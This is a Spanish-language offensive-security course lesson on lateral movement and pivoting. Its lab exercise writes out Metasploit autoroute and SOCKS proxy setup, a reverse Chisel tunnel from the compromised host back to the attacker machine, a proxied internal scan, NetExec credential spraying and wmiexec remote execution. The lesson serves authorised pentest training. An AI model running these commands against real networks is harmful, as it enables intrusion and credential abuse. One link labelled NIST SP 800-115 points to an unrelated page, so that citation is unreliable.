# Semana 11: Movimiento lateral y pivoting

Curso: [Ciberseguridad Ofensiva: Pensar como Atacante](../syllabus.md) · Semana 11 de 20

## Objetivo de la semana
Comprender y ejecutar técnicas de movimiento lateral y pivoting dentro de una red comprometida, utilizando herramientas como proxychains, Metasploit, Chisel y túneles SSH. El estudiante aprenderá a mapear rutas internas, reenviar puertos y comprometer múltiples hosts desde un punto de apoyo inicial, alineando cada acción con tácticas del marco MITRE ATT&CK.

## LECTURA
El movimiento lateral es la fase del pentesting (y del ciclo de vida de un ataque real) en la que un atacante, tras obtener un foothold en un host, intenta comprometer otros sistemas dentro de la misma red. Según MITRE ATT&CK, esta táctica se documenta como **TA0008 (Lateral Movement)** e incluye técnicas como **T1021 (Remote Services)**, **T1550 (Use Alternate Authentication Material)**, **T1570 (Lateral Tool Transfer)** y **T1563 (Remote Service Session Hijacking)**. El pivoting, por su parte, no es una táctica separada en ATT&CK, sino un habilitador: permite enrutar tráfico a través de un host comprometido para alcanzar segmentos de red inaccesibles directamente desde la máquina del atacante.

Existen tres modelos clásicos de pivoting:
1. **Port forwarding local y remoto** (SSH `-L` y `-R`): redirige puertos específicos a través de un túnel cifrado.
2. **SOCKS proxy dinámico** (SSH `-D`, `proxychains`, `Chisel`, `socks4a`): crea un proxy que permite enviar tráfico arbitrario a través del host comprometido.
3. **Túneles de capa 2/3** (VPN como `sshuttle`, `ligolo-ng`): enrutan rangos completos de IP sin necesidad de configurar proxy por herramienta.

El estándar **PTES (Penetration Testing Execution Standard)** dedica una fase completa a "Infrastructure Discovery" y "Exploitation", donde el pivoting es clave para atravesar segmentación. **NIST SP 800-115** recomienda documentar cada salto y validar el alcance autorizado antes de pivotar, ya que un pivoting mal controlado puede afectar sistemas fuera del scope. **OWASP WSTG** (WSTG-CONF-06, WSTG-INFO-05) enfatiza la identificación de interfaces internas y servicios expuestos solo desde dentro. **CIS Controls v8** (Control 12: Network Infrastructure Management y Control 13: Network Monitoring and Defense) ofrece contramedidas: microsegmentación, inspección de tráfico este-oeste, y detección de túneles mediante análisis de flujos.

En entornos Active Directory, el movimiento lateral suele apoyarse en **Pass-the-Hash (T1550.002)**, **Pass-the-Ticket (T1550.003)**, **PsExec (T1569.002)**, **WMI (T1047)**, **WinRM (T1021.006)** y **SMB/Admin Shares (T1021.002)**. En Linux, son comunes **SSH con claves robadas (T1021.004)**, **abuso de sudoers**, **cron jobs** y **contenedores Docker accesibles**. La regla de oro: cada salto debe justificarse por un objetivo de negocio definido en el Rules of Engagement (RoE) y registrarse en la bitácora del engagement.

Herramientas esenciales: **Metasploit** (`autoroute`, `portfwd`, módulos `auxiliary/server/socks_proxy`), **Chisel** (túnel HTTP/WebSocket sobre TCP), **ligolo-ng** (TUN interface, sin necesidad de proxychains), **proxychains-ng**, **socat**, **sshuttle**, **CrackMapExec/NetExec** para spray lateral, **Impacket** (`psexec.py`, `wmiexec.py`, `smbexec.py`, `atexec.py`) y **BloodHound** para identificar rutas de ataque en AD.

## EJERCICIO
**Objetivo:** Comprometer un segundo host a través de un pivot usando un túnel SOCKS y ejecutar reconocimiento interno.

**Escenario:** Tienes acceso a `WS01` (10.10.10.15, Windows) que es dual-homed y también alcanza la red interna `172.16.20.0/24`. Desde tu Kali (10.10.10.5) no hay ruta a esa red interna.

**Pasos:**
1. **Establecer foothold:** Consigue una reverse shell en `WS01` (por ejemplo, con un payload msfvenom y un handler de Metasploit `multi/handler`).
2. **Enumerar interfaces:** En el Meterpreter, ejecuta `ipconfig /all` y `route print`. Identifica la interfaz hacia `172.16.20.0/24` (ej. 172.16.20.10).
3. **Configurar autoroute en Metasploit:**
   ```
   meterpreter > run autoroute -s 172.16.20.0/24
   meterpreter > background
   msf6 > use auxiliary/server/socks_proxy
   msf6 > set SRVPORT 1080
   msf6 > set VERSION 5
   msf6 > run -j
   ```
4. **Configurar proxychains:** Edita `/etc/proxychains4.conf`, añade al final: `socks5 127.0.0.1 1080`.
5. **Reconocimiento interno:** Ejecuta `proxychains4 nmap -sT -Pn -p 22,80,139,445,3389 172.16.20.0/24` (usa `-sT` porque proxychains no soporta SYN scan).
6. **Alternativa con Chisel (sin Metasploit):**
   - En Kali: `./chisel server -p 8000 --reverse`
   - En WS01: `chisel.exe client 10.10.10.5:8000 R:socks`
   - Configura proxychains a `socks5 127.0.0.1 1080`.
7. **Movimiento lateral:** Con NetExec, prueba credenciales obtenidas previamente:
   ```
   proxychains4 nxc smb 172.16.20.0/24 -u usuario -p 'Password123' --shares
   ```
8. **Ejecución remota:** Usa `impacket-wmiexec` a través del proxy para obtener shell en el host objetivo.
9. **Documenta:** Registra cada comando, IP, hash, ticket o credencial usada, y el timestamp. Adjunta capturas.

**Entregable:** Un informe con la topología descubierta, comandos ejecutados, evidencias del compromiso del segundo host y recomendaciones de segmentación.

## CASO
**Caso real: Ataque a SolarWinds (2020) y movimiento lateral en redes gubernamentales.**
El grupo APT29 (Cozy Bear, atribuido a Rusia) comprometió la cadena de suministro de SolarWinds Orion insertando la backdoor **SUNBURST** en actualizaciones legítimas. Una vez que los clientes instalaban la actualización, el malware establecía comunicación C2 mediante el protocolo **HTTP con subdominios generados por DGA** y perfilaba la red. Tras identificar objetivos de interés, los atacantes ejecutaban movimiento lateral mediante:
- **Robo de tokens SAML** (técnica MITRE **T1606.002 - Forge Web Credentials: SAML Tokens**) para suplantar identidades federadas.
- **Pass-the-Ticket** y abuso de **Golden SAML** para acceder a servicios en la nube como Microsoft 365.
- **Uso de credenciales de aplicaciones** (service accounts) para pivotar entre tenants y entornos on-prem.

El pivoting se realizó desde servidores Orion comprometidos hacia estaciones de trabajo y controladores de dominio en redes segmentadas, aprovechando que los servidores de gestión tenían confianza implícita y rutas hacia múltiples VLANs. La detección fue tardía (meses) porque el tráfico C2 se mezclaba con el tráfico legítimo de Orion y usaba certificados válidos.

**Lecciones para el pentester:**
- Los hosts de gestión (jump servers, servidores de monitorización) son pivotes de altísimo valor.
- La federación de identidades amplifica el movimiento lateral más allá de la red.
- Sin microsegmentación (CIS Control 12) y sin monitorización este-oeste (CIS Control 13), el pivoting pasa desapercibido.
- Documentar rutas de pivoting en el informe ayuda al cliente a priorizar la segmentación.

## Recursos abiertos
- https://attack.mitre.org/tactics/TA0008/ — MITRE ATT&CK, táctica de Movimiento Lateral con todas sus técnicas.
- https://github.com/jpillora/chisel — Herramienta de túneles TCP/UDP sobre HTTP/WebSocket, ampliamente usada en pivoting.
- https://github.com/nicocha30/ligolo-ng — Túnel TUN moderno que evita proxychains y soporta múltiples saltos.
- https://www.nist.gov/privacy-framework — NIST SP 800-115, Technical Guide to Information Security Testing and Assessment.
- https://owasp.org/www-project-web-security-testing-guide/ — OWASP WSTG, guía de pruebas de seguridad con secciones de configuración y descubrimiento.

--- [Volver al syllabus](../syllabus.md)
